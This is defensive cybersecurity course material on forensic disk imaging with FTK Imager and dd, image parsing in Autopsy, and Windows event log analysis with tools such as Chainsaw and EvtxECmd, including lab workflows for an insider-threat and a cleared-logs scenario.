![image](https://github.com/user-attachments/assets/c7e04dcc-576e-4d2a-b542-81252596563a)![image](https://github.com/user-attachments/assets/9deed4e8-6fa2-4773-80fb-0c05aea32b36)![image](https://github.com/user-attachments/assets/bd2f3b47-c5ee-4182-97a8-576e87c00659)### CDAH-M16L1-Acquiring a Forensic Disk Image ###

Forensic Image File and Compression Formats
A forensic image is a copy of media, like a disk or Solid-State Drive (SSD), that can be entered legally into evidence in a court of law. Forensic images are needed to verify data integrity, because the data can be compared and verified to not have been tampered with after the image was taken. A forensic image includes all Operating System (OS) data and written bits, sectors, partitions, files, folders, master boot records, bits marked for deletion, and unallocated space. A forensic image can be manipulated and read without interacting with the original drive and the drive’s contents.

﻿

Collecting forensic images of disk sources can be accomplished in many ways and with different image formats. The image file type created depends on the tools used and the specifics of the source. An image file can be a single file that contains the entire disk source or a series of multiple files that collectively represent the source. Common image file types are as follows:

Raw byte-for-byte.
Single raw file (dd): A Linux command-line file system tool.
Split raw files (affuse): Filesystem in Userspace (FUSE)–format files.
AFF (Advanced Forensic Format).
AFD (AFF multiple file).
AFM (AFF with external metadata).
EWF (Expert Witness format [EnCase]).
Split EWF (split E01 files): A file type used by forensic imaging tools, commonly used for legal evidence-based forensic images.
VM disk image.
VMDK.
VHD/VHDX.

Toolkits provide different types of image files, depending on the need. This lesson covers basic dd-based images, FTK® Imager images, and images opened for analysis with Autopsy.

![image](https://github.com/user-attachments/assets/31f85f10-8f42-4a2c-9fcc-30908380a523)


------------------

Forensic Image Compression
Forensic image compression allows organizations to save valuable disk space for both archival requirements and data transfer needs. If all images were stored in their raw format, most organizations would run out of disk space for archived evidence or be unable to transfer larger disk images across interdepartmental networks. 

﻿

The E01 (EnCase) image file format provides a backup of acquired digital evidence that includes many different data points surrounding an image, including timestamps, contents, and other distinguishing characteristics. The E01 format is regularly used because it saves space for analysts and agents who need to keep a large number of files. The format also supports many types of metadata for ease of identification. E01 documents the disk header, logical volume health information, sector health, and other metrics related to the imaging process to verify the integrity of the compression.

﻿

Many standard file compression formats besides E01 exist, but not all are verifiably lossless or approved for evidence collection by many organizations. Third-party tools, such as LZ4 in Linux, are fast and should not compromise integrity of the image, but the image files must be rehashed each time they are decompressed to verify that all the contents of the image have been retained between compressions.

![image](https://github.com/user-attachments/assets/2a71b8d4-d274-43df-adc8-86f94e70fa2d)


------------------

Creating Forensic Images for Analysis
Forensic Image Creation Techniques and Tools 
﻿

Various tools are available for creating forensic images on Windows such as FTK Imager, and most security professionals using Linux use native OS tools like the dd command. The specific tool used matters only for compatibility reasons, not legal or procedural ones. As long as a completed image can be separately hashed and verified after an image is collected, the image can be used in a forensic context. The tools used in this lesson represent examples of the many imaging solutions available.

﻿

Windows Imaging Applications
﻿

A wide variety of disk-imaging applications exists for the Windows OS. At the height of the Windows NT era, Norton Ghost was regularly used as an imaging tool but is not used often today. Lighter-weight toolkits like the FTK imager toolkit are often used because of their fully featured suites of options related to the forensic parts of the imaging process. Windows-based tools can often integrate case files, associate hashes with images, and automatically verify file integrity for decompressed images. Many investigators use these Windows-based tools because of their consistency and ease of use.

﻿

Linux dd Command
﻿

In all distributions of Linux, the dd command allows for the creation of an image of a partition or the complete clone of a disk. Because the dd command makes full copies of the disk or partition, it requires an equal amount of, or more, storage space on the target disk for the copy. This tool is especially useful for creating images of drives that have been connected externally to the Linux machine being used if a software write blocker is installed or the disk is set to read only. A potentially corrupted or infected Windows image can be copied without opening or executing the files on the disk, all from the safety of a Linux host.


---------

Maintaining Data Integrity
Methods of maintaining integrity of data on a forensic image include use of write-protecting hardware, hashing, developing a chain of custody, and documenting the investigation.

﻿

Write-Protecting Hardware
﻿

Once a device is collected for forensic imaging, the investigator should use a hardware write blocker connected to the acquired device. This ensures that the collected device cannot be written to, even if the physical switch has been damaged or compromised. Write blockers can also be updated and regularly checked to ensure functionality between uses.

﻿

Hashing
﻿

When a drive has been imaged, a hash should be created to verify the integrity of the data. If a single bit of data changes between image files, a properly hashed forensic image does not match what was initially collected, indicating evidence tampering. Common hashing standards for forensic images are the same as for individual files (MD5 of SHA1). The hash represents a “fingerprint” formed by creating a numerical value based on the bit values in the image that are then run through a hashing table.

﻿

Chain of Custody
﻿

Where feasible, it is best to implement a chain of custody during an investigation. A chain of custody is an established list of individuals who own certain parts of the forensic process. A chain of custody is standard practice for many forms of evidence, not just forensic images, and this practice creates a burden of responsibility for individuals handling the evidence in question. Sometimes an initial investigation does not require the rigor of full chain-of-custody evidence collection precautions, but understanding when to form a chain of custody can help investigators ensure the integrity of what they have collected at different points in the investigative chain. Each organization has its own operating procedures that should be followed when a chain of custody is required and should be referenced as appropriate.

﻿

Investigation Documentation
﻿

Proper documentation throughout the investigative process is key to building trust in the evidence collected. Investigators should follow their organization’s procedures for proper documentation. As forensic evidence is collected, notes should be taken for every item, relevant persons should be noted for reference, reports should be made about the process taken for the investigation, and proper organization of these notes for potential submission should be developed.


----------------

Create a Forensic Image with FTK Imager
Complete the steps in the following workflow to create a forensic image of the Documents folder on a Virtual Machine (VM) using FTK Imager. 

﻿

Workflow
﻿

1. Log in to the VM win-hunt using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open FTK Imager on the desktop.

﻿

3. Select File > Create Disk Image.

﻿

4. Select Contents of a Folder from the bulleted list, and select Next. Select yes when prompted.

﻿

5. Select the Browse button, expand the trainee folder, select Documents, and select OK.

﻿

6. Select Finish.

﻿

7. Select the Add button to add a destination for the image file.

﻿

8. Enter the following as a sample for the evidence information for this image:

Case Number: 01
Evidence Number: 02
Unique Description: Test
Examiner: Trainee
Notes: N/A

9. Select Next.

﻿

10. Select Browse, and set the image destination as the desktop.

﻿

11. Select OK.

﻿

12. Enter Documents Image in the Image Filename field.

﻿

13. Select Finish.

﻿

14. Select Start.

﻿

The image is created, and the hash of the image is displayed. 

﻿

15. Close FTK Imager. 

﻿

The image was created on the desktop as a .e01 file, with a text file with the relevant evidence information for reference.

﻿

In a real-world scenario, these steps would likely be performed to collect an image of the entire disk from a physically collected drive.



------------------


Open a Forensic Image with Autopsy
Autopsy is a forensic image examination tool that allows an investigator to build a case using a given image. Complete the steps in the following workflow to open the image created in the previous workflow for analysis.

﻿

Workflow
﻿

1. Log in to the VM win-hunt using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Autopsy on the desktop.

﻿

3. Select New Case.

﻿

4. Add the case name Sample, and browse to the Documents folder to set the base directory.

﻿

5. Select Next.

﻿

6. Enter the case number 01, and select Finish.

﻿

A sample case is created that can be used to gather forensic evidence with Autopsy. An image file can be examined for a number of different uses, and organizations often have standard practices regarding forensic image analysis.

﻿

Autopsy requires a data source to be added, and its integrity must be verified, based on the other data provided.

﻿

7. Select Specify New Host Name, enter Case Host, and select Next.

﻿

8. Select Disk Image or VM File, and select Next.

﻿

9. Select the Browse button, and select the .e01 image on the desktop.

﻿

10. Select Next on the Configure Ingest screen. 

﻿

11. Select Finish on the Add Data Source screen.

﻿

12. Once the case completes, expand the Data Sources option, expand the Case Host option, and select TestCase.E01 to view the image properties.

﻿

13. Select the Summary tab, and select the Container tab.

﻿

14. Visually compare the MD5 hash provided with the MD5.txt file on the desktop.

﻿

If the two hash values match, integrity of the image has been maintained. A difference between the two hash values indicates tampering or corruption of data. Should such a difference occur, work back through the case change log to find the point at which the hash change occurred.

![image](https://github.com/user-attachments/assets/07300ad3-cc5d-4b3f-a701-bb8db1a7095a)



----------------

Create a Forensic Image with dd
Creating an image for forensic analysis can be done in multiple ways. Complete the steps in the following workflow to create image copies that retain their validity as evidence using dd and FTK Imager.

﻿

Workflow
﻿

1. Log in to the VM lin-hunt-cent using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open a new terminal session, and run the following command to obtain a hash of the target partition to compare with copies. If prompted, use the password CyberTraining1!.

$ sudo sha512sum /dev/sda1
﻿

3. Collect a copy of the image by running the dd command:

sudo dd if=/dev/sda1 of=/opt/sda1dd bs=64k conv=noerror,sync 
﻿

In the above command, if represents the input file and of represents the output file. This command creates an image named sda1Image in the /opt/ directory.

﻿

4. Set the file to read only by running the following command:

sudo chmod 0444 /opt/sda1dd
﻿

5. Run the following command to hash the image file to ensure that the contents of the copied image are the same and verify that no errors occurred during the copying process:

sha512sum /opt/sda1dd
﻿

The hash produced should match the original hash.

﻿

6. If the hashes are different, compare the original hash by running the following command:

echo "replaceWithHashFromStep2 /opt/sda1dd" | sha512sum -c
﻿

If the comparison is successful, the following is displayed:

/opt/sda1dd: OK
﻿

If the comparison fails, the following is displayed:

/opt/sha512dd: FAILED
sha512sum: WARNING: 1 computed checksum did NOT match
﻿
![image](https://github.com/user-attachments/assets/bc8f6c0a-d12e-4d99-8c90-d98920bef56c)
![image](https://github.com/user-attachments/assets/edd4d131-3396-434a-bf96-8a6e984a6449)


---------------


Creating a Forensic Image from a Remote Source
When the disk to be imaged or the system housing the disk is not physically accessible, remote imaging methods must be used. In some cases, specifically with smaller data sizes, service agents can be used on the remote system to capture the image. The agent may be bootable media that allows collection of disk images while the OS is stopped or an active agent process running on the OS. Collection and electronic transfer of large disks may require many hours or even days. Data collection may be limited to partial acquisition instead of the entire disk or partition, such as collecting specific files or folders. 

﻿

In most cases, specialized forensic imaging kits are sent to remote locations for local administrators to use in the imaging process. These kits allow local forensic image collection, after which the image is shipped back to the investigating team for analysis. Acquiring evidence that needs to be shipped or transported also often requires an established chain of custody for added security. This practice is in place because imaging over a network connection can fail and leave incomplete or corrupted images when network conditions are unstable.


-----------

### CDAH-M16L2-Parsing a Forensic Disk Image ###

Disk Image Parsing Tools and Techniques
Forensic images may be captured in several different formats using tools designed for bit-by-bit copy. These tools create a portrayal of a physical hard disk state that is as accurate as possible for further investigation. Once the images are captured, parsing the file for valuable information is a matter of choosing the right analysis method with the chosen tool. 

﻿

Forensic Image Formats
﻿

The most common forensic image file formats are described below, though this does not encompass all file formats. Image parsing tools can typically handle standard file formats, including these.

﻿

RAW
﻿

The RAW file format is created by the Linux disk imager utility dd. The dd format provides simple bit-for-bit representations of the data imaged by the utility, without additional hash data or compression. 

﻿

E01
﻿

The E01 file format is created by the EnCase tool. When broken into multiple segments, the image metadata includes a hash for each segment and metadata entered by an examiner regarding when the image was captured. Each segment is stored as a separate file with a 640-megabyte (MB) maximum size. The header of an E01 image file provides the case information that a user inputs at the time of collection; this includes the name of the investigator, case name or number, media from which data is transcribed, the date and time of collection, and the software and Operating System (OS) versions of the collection device. E01 is the most common format in the Expert Witness Disk Image Format (EWF) family.

﻿

SMART
﻿

SMART is a file format for Linux imaging software and a legacy format in the EWF family. Image files formatted with this standard use the .s01 extension.

﻿

Advanced Forensic Format (AFF)
﻿

The Advanced Forensic Format file type is a non-proprietary extensible file format. It is designed to store disk images of any size, with or without compression, in one or many files. The image includes file metadata at the time of capture. The format definition also includes provisions for internal self-consistency checking and for certifying evidence file authenticity. Both of these features are important for the integrity of data for law enforcement functions and to recover data, even if a portion of the drive has been corrupted.


---------------

Forensic Imaging Tools
dd
﻿

The dd command-line utility is employed by administrators to copy hard drives and device files into backup locations, sometimes with data-encoding conversions during the copying process. Because the file type of the output is “raw” data, the image format RAW is synonymous with the format dd.

﻿

EnCase
﻿

EnCase is an industry-standard tool for capturing forensic images of hard disks for evidence in law enforcement investigations or threat hunts as well as Incident Response (IR) actions. It stores captured images in its proprietary E01 format.

﻿

FTK® Imager
﻿

FTK Imager is a popular, free alternative to EnCase. It can store images in the E01 or SMART format.


--------------


Image Parsing Tools
The Sleuth Kit (TSK) and Autopsy
﻿

The Sleuth Kit is a collection of command-line forensic tools and C language libraries used for disk image analysis and file recovery. Autopsy is a browser-based User Interface (UI) front-end application for The Sleuth Kit that improves the efficiency and user-friendliness of the analytical effort involved in parsing hard drive and mobile disk images. It runs as a Hypertext Transfer Protocol (HTTP) service served to the localhost interface. Functions available through these tools include listing all files on a system, cataloging file types, recovering deleted files, and performing hash-based or keyword searches on a file system. This lesson uses Autopsy during a hands-on exercise.

﻿

Foremost
﻿

Foremost is a forensic program, available in distributions such as Kali or the SANS™ Institute’s SIFT™ Workstation, used to recover deleted files from a disk or image file through analysis of headers, footers, and internal data structures. The headers and footers can be specified by a configuration file or the use of command-line switches to specify built-in file types. These built-in types look at the data structures of a given file format, allowing for a more reliable and faster recovery.


------------

Disk Image Analysis Techniques
Mounting an Image to a File System
﻿

To analyze a disk image, an analyst may either run the image through an analysis tool (such as Autopsy, for which techniques are described below) or mount the image with an application (such as OSFMount). The difference is that running an analysis represents a static analysis, which does not alter the image in any way, whereas mounting an image to a file system alters and corrupts the image unless it is mounted in read-only mode. (However, for IR and hunts, mounting the image to a file system rather than in a Virtual Machine [VM] may allow for advanced dynamic malware analysis when the mounting occurs in a sandbox environment.)

﻿

Keyword Searches
﻿

Keyword searches of a file system image may be performed using American Standard Code for Information Interchange (ASCII) strings and grep regular expressions. Searches may be performed on the full file system image or only the unallocated space. An index file may be created for faster searches. Strings that are frequently searched for can be easily configured in Autopsy for automated searching.

﻿

Temporal Analysis
﻿

A timeline of file activity can help identify areas of a file system that may contain evidence. Autopsy can create timelines that contain entries for the Modification, Access, and Change (MAC) times of both allocated and unallocated files.

﻿

Deleted Files and Unallocated Space Searches
﻿

Portions of the file system marked as unallocated space may be examined to recover the contents of deleted files if those disk sectors are not already overwritten for new files. 

﻿

File Listings
﻿

The contents of files may be viewed in RAW or hex format, or the ASCII strings can be extracted. When data is interpreted, Autopsy sanitizes it to prevent damage to the local analysis system. Autopsy does not use any client-side scripting languages. The files are sorted based on their internal signatures to identify files of a known type. Autopsy can also extract only graphic images (including thumbnails). The extension of the file is also compared to the file type to identify files whose extensions have been changed to hide them.

﻿

Metadata Analysis
﻿

Metadata structures contain the details about files and directories. Autopsy allows details of any metadata structure in the file system to be viewed. This is useful for recovering deleted content. Autopsy searches the directories to identify the full path of the file that has allocated the structure.

﻿

Data Unit Analysis
﻿

Data units are where the file content is stored. Autopsy allows the contents of any data unit to be viewed in a variety of formats, including ASCII, hexdump, and strings. The file type is also provided, and Autopsy searches the metadata structures to identify which has allocated the data unit.

﻿

Image Details
﻿

File system details can be viewed, including on-disk layout and times of activity. This mode provides information that is useful during data recovery.

![image](https://github.com/user-attachments/assets/0ee1bd04-09a3-4780-a00f-3c84de306418)


-------

Parse a Forensic Disk Image
In the following lab, read the scenario below, and complete the workflows to parse a forensic disk image. The lab comprises two workflows:

Opening a new case in Autopsy.
Obtaining a file listing through forensic image parsing.
Scenario
﻿

The mission partner has determined that an insider threat information smuggling operation is occurring in their network. They have passed along a forensic image of a system suspected to have been used for the activity. Access the CPT SIFT Workstation, and analyze the image with Autopsy to run basic analysis of the imaged system.

﻿

Open a New Case
﻿

Complete the steps in the following workflow to open a new case in Autopsy.

﻿

Workflow
﻿

1. Open the sift analyst workstation. The login credentials are as follows:

Username: trainee
Password: CyberTraining1!
﻿

2. Open a terminal window.

﻿

3. Launch the Autopsy service with the following command:

trainee@siftworkstation:~$ sudo autopsy
[sudo] password for trainee: CyberTraining1!
﻿

4. Open the Firefox browser, and select the Autopsy bookmark or navigate to the address http://localhost:9999/autopsy.

﻿

5. Select New Case.

﻿

6. Enter the metadata relevant to the case:


Case Number: This field should contain a unique identifier (ID) assigned by a supervisory authority that manages all assigned cases. For this exercise, use the case name CDAH01.
Description: This field is a 32-character field for which a short phrase providing an investigation title is appropriate. (The field is not meant to include copious descriptions of the case.) For this exercise, use the current date and the title Insider Threat.
Investigator Names: In this field, provide the first and last names of the analysts collaborating on the investigation. Figure 16.2-1 provides the example names John Doe and Jane Doe.
﻿

![image](https://github.com/user-attachments/assets/974d2adf-6722-4d9b-9985-dbc696320528)


7. Select New Case when complete.


8. After receiving confirmation that the case is created, select Add Host to add information about a system that is being investigated:

![image](https://github.com/user-attachments/assets/679f4ccd-3937-43ef-90bb-47a706779a09)

9. Add the following metadata for the host being investigated:

Host Name: host_jean_o1
Description: Jean’s Computer
Time zone: <leave blank>
Timeskew Adjustment: 0
Path of Alert Hash Database: <leave blank>
Path of Ignore Hash Database: <leave blank>

10. Select Add Host to move to the next view:

![image](https://github.com/user-attachments/assets/018a2a74-67a9-49f3-a710-865e3f5aee34)

11. Select Add Image:

![image](https://github.com/user-attachments/assets/5b46e58d-dbb2-40b9-8b3a-a3390b67a465)

12. Add the disk image file to analyze. The path for the file is /home/trainee/Desktop/Cases/nps-2008-jean.e0*.
Select Disk as the image file type and Symlink as the method to import the image file into the Autopsy folders, and select Next:

![image](https://github.com/user-attachments/assets/480a1341-61d1-4082-9663-5c23f72f1fc4)


NOTE: The wildcard character (*) is placed at the end of the file path so that Autopsy can retrieve all the image files. This is because EnCase disk image captures number the file extensions of the image sequentially when the image is split into multiple files.

![image](https://github.com/user-attachments/assets/722d2b9f-ddbe-45fe-a047-cc087b80786a)


13. Select Next, and select Add.



When the files are loaded, Autopsy automatically detects the file system type and mount point:


![image](https://github.com/user-attachments/assets/7f85c4b3-072f-4cb2-8414-bf28cd95276c)

Select OK and keep the VM sift open for the next workflow.

----------------------

Obtain a File Listing
Complete the steps in the following workflow to open an analysis view of the image to peruse system files and conduct image parsing to list files.

﻿

Workflow
﻿

1. Select the radio button for NTFS disk volume, and select Analyze. (The NTFS volume, rather than the RAW disk image, is selected, as the NTFS volume is already formatted by Autopsy, making its contents readable by the tool.)

﻿
![image](https://github.com/user-attachments/assets/d36de7ef-831f-458e-97bd-0b15ba6bccdc)


2. Select the File Analysis tab at the top of the UI.




3. Select Expand Directories in the left pane to view the directory listing for the system:


![image](https://github.com/user-attachments/assets/d4b68e0f-8880-4448-949e-fad1431ba227)

![image](https://github.com/user-attachments/assets/73c49b32-0bcb-49d1-b8e0-d1c66e511372)



4. Obtain a file listing for all files in the C: directory (which appears by default) by selecting Generate MD5 List of Files:

![image](https://github.com/user-attachments/assets/ab1a3b99-fa38-4ddc-b31e-0a117e0f37f7)

One benefit of using this tool to generate the file listing is that in the event that a file is identified as an Indicator of Compromise (IOC), the MD5 hash helps to quickly find identical files, regardless of the filename or location used by threat actors. 

![image](https://github.com/user-attachments/assets/9de232f4-7dbe-4b3d-97ef-650598b465fd)


In addition to a file listing of each file in a directory, Autopsy may be used to generate a whole system survey by file type. 


5. Close the MD5 List tab and select the File Type tab.


6. In the left pane, select Sort Files by Type and then OK:


Because this process may require 10 to 30 minutes to complete, the file type analysis has been run in advance for this exercise, and the resulting documents are already prepared in the Cases folder on the desktop. The screenshots below are only for reference, proceed to Step 7.

![image](https://github.com/user-attachments/assets/c8d8ae8b-def7-4cfb-92f5-c01ac3d7325b)

In using this feature, an option exists to exclude some files from the survey and validate the extensions.


If this survey is initiated, the following progress screens indicate the results:


![image](https://github.com/user-attachments/assets/4cdb9fa3-57fb-48ab-8a8e-d8b87bf6d41f)

![image](https://github.com/user-attachments/assets/58481cd2-72c9-46e7-9aae-099af7a16810)


7. Unpack the documents from the Cases folder to the Autopsy folder for this case and host with the following command:
sudo tar -zxvf /home/trainee/Desktop/Cases/filetypes.tar.gz -C /



8. Open a new Firefox browser tab, and enter the following address to view the Hypertext Markup Language (HTML) report of the file types in the system:
file:///var/lib/autopsy/CDAH01/host_jean_o1/output/sorter-vol2/index.html

![image](https://github.com/user-attachments/assets/97ccc9d1-db18-4b21-a0e2-f3aed7fcd330)


Deleted files may be viewed using the File Analysis tab.


Using the above workflows, answer the following questions.


![image](https://github.com/user-attachments/assets/5c62c779-3013-47eb-b6df-5eaebc083abe)

![image](https://github.com/user-attachments/assets/b04ecf9f-c0bf-4e0b-9c79-7ed90d64d4b6)
![image](https://github.com/user-attachments/assets/2458f377-be4b-4ae9-a1c6-efd1aec0a07e)


![image](https://github.com/user-attachments/assets/a8a7e212-8535-4172-b256-c037a0622d2f)

------------------

### CDAH-M16L3-Windows Event Log Analysis ###


Reviewing Windows Event Logs
Accessing Event Logs
﻿

Windows event logs are stored on the same partition as the Windows installation drive. By default, Windows is usually installed on the C:\ drive and the full path to the event logs is C:\Windows\System32\winevt\Logs. Figure 16.3-1 is a view of the directory where the event logs are stored.


![image](https://github.com/user-attachments/assets/3b7c14ea-777c-407d-9260-dc1de6d01595)


Extracting Logs
Windows event logs stored within a forensic image are still in the same directory as listed above, but it takes a few more steps to access them. A forensic image is mounted either through OSFMount or within the Forensic Toolkit (FTK). Both of these tools are free and access the forensic image in a read-only state. FTK can also view the file system of the image without mounting the image, which is useful when looking for deleted files. TFTK provides access to locations that the Windows Operating System (OS) hides by default, which OSFMount does not. For example, the Master File Table (MFT) file $MFT is not visible during a mount, but FTK shows the file. Also, OSFMount does not show files that have been deleted like FTK.

﻿

NOTE: Trainees are not expected to perform the following Mount or FTK Methods. These are performed in the labs later in the lesson.

﻿

Mount Method
﻿

OSFMount requires the path to the forensic image to be able to access the files within it.

﻿

1. Select Mount new, browse to the forensic image, and select Next.

﻿
![image](https://github.com/user-attachments/assets/e19b014b-f943-4e65-983b-887320d7ab94)

2. Select the Windows partition. The Windows partition is typically the largest. In this case, it is Partition #1 and is 58.91GB in size.


![image](https://github.com/user-attachments/assets/3fb42c6c-3029-4b2d-be8a-29a90c9a9e87)


3. Do not make any changes and select Next.


NOTE: OSFMount skips Step 3; the steps go from Step 2 straight to Step 4.

![image](https://github.com/user-attachments/assets/811a0d87-8685-472e-8138-867da414a8d4)

4. Select Mount. OSFMount shows the drive letter assigned to the forensic image. Afterward, browse the log directory F:\Windows\System32\winevt\Logs with Windows Explorer to access the event logs. Copy the files of interest out of the image and stored on the local disk.

![image](https://github.com/user-attachments/assets/4f3968d9-e725-4717-aed8-0cd31a031864)


FTK Method


1. Open AccessData FTK Imager. User Access Control (UAC) appears as this application is being run with administrative privileges. Select Yes.


2. Select Add Evidence > Image File > Next.

![image](https://github.com/user-attachments/assets/bf34fc3c-4b65-4b81-9b76-03de8732a33e)

3. Enter the source path to the forensic image.


![image](https://github.com/user-attachments/assets/984bd483-3ea8-4000-ad81-8807fc643caa)

4. Expand the forensic image by selecting the plus sign (+) next to the image name. Continue expanding until Windows\System32\winevt\Logs is displayed.


![image](https://github.com/user-attachments/assets/0b50d4df-f6c0-4bf7-aa44-2e30d920c68a)


![image](https://github.com/user-attachments/assets/40351e9f-c002-4a88-91d2-c0be2c96b060)

5. Select the log files of interest, right-click and select Export Files, and save the files on the local disk.

![image](https://github.com/user-attachments/assets/e464d46c-82cd-48f6-95cf-a7d809f4f2df)

Another tool, Evtxtract, extracts event logs directly from a forensic image using Python, which is discussed later. The most common method is to use FTK to view the forensic image.


--------------

Tools
The Windows event logs have been extracted from a system and need to be analyzed. Windows event logs are stored in a binary format and require specific tools for them to be read. Prior to Windows Vista, event logs had the file extension .evt. Every version of Windows from Vista to Windows 11 uses the .evtx format. Occasionally Windows Event Viewer requests converting older EVT-formatted event logs to EVTX when analyzing the older format on a current version of Windows. If necessary, the older EVT format can be converted to EVTX using the built-in wevtutil utility. Sample syntax is as follows:

wevtutil export-log <sourcelogfile>.evt <targetlogfile>.evtx /lf 
﻿

The following tools are the most commonly used in the industry and are publicly available for free:

Windows Event Viewer
F-Secure’s Chainsaw
Eric Zimmerman’s EvtxECmd
William Ballenthin’s Python modules evtxtract and python-evtx
﻿

Windows Event Viewer
﻿

The Windows Event Viewer is the default viewer that ships with all versions of Windows. It allows for filtering by event ID, searching for text within the event logs, sorting, and cleanly displaying all information with column headings. The drawback is that it only allows for one event log to be viewed at a time and does not have any additional logic to assist with finding suspicious activity.


![image](https://github.com/user-attachments/assets/8dc94c11-cbae-45f4-9475-a5cf15925cb5)


Chainsaw


Chainsaw was created by the Finnish cyber security company F-Secure. Chainsaw has built-in logic with mapping files written in YAML that can quickly extract items that match custom rules and display them to the analyst. Chainsaw saves cyber defenders hours by analyzing all available event logs at once and generates a report. Chainsaw also dumps all events pertaining to a specific event ID if that is preferred.


Syntax


Search all event logs for activity that matches rules:
chainsaw.exe hunt C:\windows\System32\winevt\Logs -r sigma_rules/ -m mapping_files/sigma-mapping.yml --lateral-all --ignore-errors



Dump all logon events:
chainsaw.exe search C:\windows\System32\winevt\Logs\ -e 4624 –output 4624_events.txt


![image](https://github.com/user-attachments/assets/25a89825-571d-4c2b-a6ec-9a9377fd3ff7)


EvtxECmd


EVTX Explorer (EvtxECmd) was written by Eric Zimmerman at Kroll who also wrote Kroll Artifact Parser and Extractor (KAPE), which is a widely used forensic toolkit. EvtxECmd processes a large number of event logs at once. It has a list of indicators, similar to Chainsaw, that it looks for and writes the most significant events into a spreadsheet for an analyst to review.


Syntax
EvtxECmd.exe -f C:\Windows\System32\winevt\Logs\ --csv "C:\Users\Trainee\Desktop" --csvf MyOutputFile.csv


![image](https://github.com/user-attachments/assets/2cd8ed82-3bd3-4102-8ca5-409204bfced3)

![image](https://github.com/user-attachments/assets/9d6cce31-8e26-49cd-b480-bf01f6408b27)



Python Modules


Willi Ballenthin from Mandiant wrote two Python tools to extract Windows event logs. The module python-evtx is a module that can be imported into Python scripts to convert the binary format that event logs are stored in and output the logs into Extensible Markup Language (XML) or text. Ballenthin also wrote a tool called EvtXtract that carves event logs from a forensic image based on the header of event log files.


Syntax for Evtxtract
"C:\Program Files\Python310\Scripts\evtxtract.exe" E:\winserv.001 > E:\eventlogs\evtx.xml



The python-evtx module requires a script to be written that uses the module before parsing the logs. This is used if there is a need to parse a large number of logs and if only a select few fields need to be exported from a log. This module allows for customization but overall requires the most setup when compared to the other options available.


------------------


Event IDs
This lesson has covered how to extract event logs and access their contents, but to make sense of them, event IDs need to be understood to filter event logs for specific events. There are hundreds of events in each event log file. Microsoft attempts to categorize activity and place it into its own file to limit file sizes and make it easier to find events. Note that some events are in multiple event log files. For example, when a new process is created on the system, the Security event log records it as event ID 4688, whereas Sysmon records it as event ID 1. Table 16.3-1 is a short list of the most common event IDs and logs.

![image](https://github.com/user-attachments/assets/4ec8c949-cb03-415b-82db-7c08fc7a8665)



------------

Deleted Logs
Attackers commonly delete, clear, or overwrite event logs in an attempt to cover their tracks. Depending on the method used by the attacker to perform these actions, it may be possible to recover the deleted event logs. Within FTK, any non-securely deleted file is prefaced with a red X icon before its filename. Armed with this knowledge, it is possible to browse through a forensic image and to look for event logs in the C:\Windows\System32\winevt\Logs directory and the C:\$Recycle.Bin directory to look for deleted files. Once found, right-click on the file of interest, select Export File, and save the file to the local disk. The event log can then be opened by any of the tools previously mentioned.

﻿

The $Recycle.Bin directory contains files that were deleted but were not overwritten. To access this location in FTK, the path is [root]/$Recycle.Bin and the Security Identifier (SID) of the user account that deleted the files. In this case, it is the Administrator account shown here as:

S-1-5-21-3227957547-616921804-3487276839-500
﻿

Within the specific SID directory, there are many deleted event logs present. The names of the files have been changed, but by selecting one of the files and looking at the hex view below the file, it can be seen that the $R513JPG.evtx file is actually the Microsoft-Windows-WMI-Activity%40Operational.evtx event log.


![image](https://github.com/user-attachments/assets/98eaeb1a-782c-478c-9ec2-9e3fbe0a634c)
![image](https://github.com/user-attachments/assets/e39cf0ed-af86-41b5-8eac-3321e484aa59)


-------------

Accessing Windows Event Logs
Scenario
﻿

There is potentially Malicious Cyberspace Activity (MCA) on a Windows server within the network. Events in Elasticsearch correlate to the time of the activity. The server has been taken offline and the associated forensic image has been collected for analysis. The time of the suspicious activity begins on May 26, 2022 @ 16:08:00 and ends on May 26, 2022 @ 16:18:00.

﻿

Workflow
﻿

1. Log in to the win-hunt Virtual Machine (VM) using the following credentials: 

Username: trainee
Password: CyberTraining1!
﻿

2. Open Chrome and select Discover - Elastic.

![image](https://github.com/user-attachments/assets/ba921ac7-7911-461a-a3c9-e9172c0505d8)

3. Select Advanced and Proceed to 199.63.64.92 (unsafe) on the Your connection is not private page.


4. Log in to Elastic using the following credentials
Username: trainee@jdmss.lan
Password: CyberTraining1!



5. Set the Kibana filter dates to:
Start date: May 26, 2022 @ 16:08:00.000End date: May 26, 2022 @ 16:18:00.000


![image](https://github.com/user-attachments/assets/c042d68f-9d52-4f09-8d91-17c2f6852737)


6. Query for the hostname of the device being analyzed to filter the logs:
agent.name:dc01



7. Change the view filter to only see the Windows event logs. In the search box, enter the following:
event.module


![image](https://github.com/user-attachments/assets/9e7d61b4-5573-46fc-b0a9-373b47fc193b)


8. Hover the mouse over the right corner of the Popular box and select Add field as a column. 


![image](https://github.com/user-attachments/assets/cf70b3ee-e63a-482e-95d4-6c5e5337fe03)

9. In the Search field names box, search for the following filters and add them as columns:
event.provider

winlog.channel

winlog.event_id

![image](https://github.com/user-attachments/assets/f7c207e8-8410-491b-b2b5-626dff057402)

NOTE: The winlog.event_id shows a warning icon, which is not a concern. The lab works properly regardless.


It is time to correlate what is available in Elastic to what is in the forensic image. 


10. Minimize Chrome and open AccessData FTK Imager. User Access Control (UAC) appears as this application is being run with administrative privileges. Select Yes.


11. Add the forensic image E:\winserv.001 into FTK Imager.

![image](https://github.com/user-attachments/assets/c093fdcf-f6a4-4c37-ad7a-042cfc0aaafc)


![image](https://github.com/user-attachments/assets/0d04540a-adc0-42c2-93f9-29e29c5ac870)


12. Expand winserv.001 to Partition 2/Windows [NTFS]/[root]/Windows/System32/winevt/Logs.

![image](https://github.com/user-attachments/assets/e2a8335e-b3ea-4c52-b534-a165950121bf)


![image](https://github.com/user-attachments/assets/ffe4ed95-8703-4188-8584-dd5d110ff664)


13. Locate the following logs in the Logs directory as they were present in Elastic:
System

Security

Microsoft-Windows-Sysmon%4Operational.evt

xMicrosoft-Windows-WMI-Activity%4Operational

Microsoft-Windows-TaskScheduler%4Operational

Microsoft-Windows-PowerShell%4Operational


Notice that those specific event logs are not present in the forensic image. This shows a potential Indicator of Compromise (IOC); the attacker attempted to cover their tracks. It also shows the importance of sending logs to Elastic before they are cleared locally.

![image](https://github.com/user-attachments/assets/19d7db0c-ffb1-488e-82f4-a143884b450a)


-----------------------

